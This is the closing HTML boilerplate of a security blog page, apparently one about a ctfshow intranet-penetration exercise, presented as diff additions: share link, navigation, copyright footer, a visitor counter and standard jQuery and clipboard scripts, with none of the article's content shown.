+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&t=ctfshow入门内网渗透"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
